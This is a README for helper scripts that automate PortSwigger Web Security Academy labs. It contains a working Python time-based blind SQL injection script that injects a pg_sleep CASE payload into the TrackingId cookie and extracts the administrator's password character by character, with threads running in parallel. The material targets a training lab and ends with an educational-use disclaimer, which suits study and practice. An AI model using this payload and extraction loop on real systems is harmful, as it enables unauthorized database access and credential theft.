# PortSwigger Lab Helper Scripts

## Overview
This repository contains advanced automation scripts designed to assist with PortSwigger Web Security Academy labs. These scripts significantly reduce the time required to complete certain exercises, especially those that involve blind SQL injection and other time-intensive attack vectors.

Many labs require manual testing or Pro features, making them difficult for users with limited resources. This project aims to streamline the process and improve efficiency by automating repetitive tasks.

## Features
- **Automated SQL Injection**: Leverages time-based blind SQL injection to extract data.
- **Parallel Execution**: Utilizes Python's `ThreadPoolExecutor` for efficient concurrent requests.
- **Customizable Configuration**: Easily adapt scripts to different lab environments.
- **Time Optimization**: Reduces manual effort in identifying vulnerabilities and extracting information.

## Installation
Ensure you have Python 3 installed and set up a virtual environment (optional but recommended):

```sh
python3 -m venv venv
source venv/bin/activate  # On Windows use 'venv\\Scripts\\activate'
pip install -r requirements.txt
```

## Usage
Edit the script to replace the following placeholders with your actual values:
- `YOUR-ID` → Your assigned Web Security Academy ID
- `YOUR-TRACKING-ID` → Tracking ID used in the target request
- `YOUR-SESSION` → Your active session cookie

Example execution:
```sh
python blind_sql_injection.py
```

## Code Example
Below is a simplified version of one of the scripts:
```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Configuration
target_url = "https://YOUR-ID.web-security-academy.net/"
cookie_template = "YOUR-TRACKING-ID'||(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users)--"
session_cookie = "YOUR-SESSION"
characters = string.ascii_lowercase + string.digits

# Response time measurement
def get_response_time(position, char):
    cookies = {"TrackingId": cookie_template.format(pos=position, char=char), "session": session_cookie}
    start_time = time.time()
    requests.get(target_url, cookies=cookies)
    return char, time.time() - start_time

# Password extraction
password = ""
for pos in range(1, 21):
    print(f"[*] Testing position {pos} [a-z0-9]")
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = {executor.submit(get_response_time, pos, char): char for char in characters}
        best_match = max((f.result() for f in as_completed(results)), key=lambda x: x[1])[0]
        password += best_match

print(f"[+] Extracted password: {password}")
```

## Disclaimer
These scripts are intended for **educational purposes only** and should only be used on authorized systems, such as PortSwigger labs. Unauthorized use against third-party applications is strictly prohibited and may result in legal consequences.

## Contribution
Feel free to submit issues or contribute enhancements via pull requests. Security and performance improvements are always welcome.


